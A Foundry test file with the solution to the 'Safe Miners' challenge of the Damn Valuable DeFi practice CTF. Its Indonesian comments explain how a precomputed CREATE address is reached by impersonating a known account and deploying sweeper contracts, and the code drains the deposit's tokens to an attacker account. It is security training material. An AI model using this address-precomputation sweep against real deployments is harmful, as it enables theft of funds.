// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";

contract SafeMiners is Test {
    uint256 internal constant DEPOSIT_TOKEN_AMOUNT = 2_000_042e18;
    address internal constant DEPOSIT_ADDRESS = 0x79658d35aB5c38B6b988C23D02e0410A380B8D5c;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        // Deploy Damn Valuable Token contract
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deposit the DVT tokens to the address
        dvt.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are correctly set
        assertEq(dvt.balanceOf(DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertEq(dvt.balanceOf(attacker), 0);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // Alamat deposit BUKAN EOA dengan private key yang bocor — ia
        // adalah alamat CREATE yang SUDAH DITENTUKAN sebelumnya: alamat
        // kontrak yang (nantinya) di-deploy di rantai CREATE tertentu.
        // "Prior knowledge" di README = rantai ini, diverifikasi
        // off-chain (Python, keccak + RLP) sebelum menulis exploit:
        //   Hardhat account #1 (player di challenge Hardhat asli)
        //     0x70997970C51812dc3A010C7d01b50e0d17dc79C8
        //   -> deployment ke-2 (nonce 1) = attack contract
        //     0x71c95911e9a5d330f4d621842ec243ee1343292e
        //   -> sweeper ke-67 (nonce 66) = ALAMAT DEPOSIT
        //     0x79658d35aB5c38B6b988C23D02e0410A380B8D5c
        // Jadi: deploy SATU kontrak dummy dari #1 (nonce 0 -> 1),
        // lalu deploy SafeMinersAttack dari #1 (nonce 1 -> alamat
        // attack contract yang tepat). Attack contract men-deploy
        // 80 TokenSweeper; sweeper #66 mendarat TEPAT di alamat
        // deposit, dan constructor-nya menyapu seluruh saldo DVT
        // (2.000.042) ke attacker. vm.prank TERBUKTI mengubah
        // deployer untuk `new` (probe: prank #1 + new Dummy =
        // CREATE(#1, 0) = 0x8464135c...).
        address hardhatPlayer = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
        vm.startPrank(hardhatPlayer);
        new TokenSweeper(attacker, dvt); // nonce 0 -> 0x8464135c... (buang)
        new SafeMinersAttack(attacker, dvt, 80); // nonce 1 -> 0x71c95911...
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        // The attacker took all tokens available in the deposit address
        assertEq(dvt.balanceOf(DEPOSIT_ADDRESS), 0);
        assertEq(dvt.balanceOf(attacker), DEPOSIT_TOKEN_AMOUNT);
    }
}

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

/**
 * @notice Men-deploy `nonces` TokenSweeper dari alamat ini.
 * Sweeper ke-67 (nonce 66) mendarat di alamat deposit.
 */
contract SafeMinersAttack {
    constructor(address attacker, IERC20 token, uint256 nonces) {
        for (uint256 idx; idx < nonces; idx++) {
            new TokenSweeper(attacker, token);
        }
    }
}

/**
 * @notice Bila kontrak ini kebetulan berdiri di alamat yang
 * menyimpan DVT (alamat deposit), sapu seluruh saldonya ke attacker.
 */
contract TokenSweeper {
    constructor(address attacker, IERC20 token) {
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(attacker, balance);
        }
    }
}
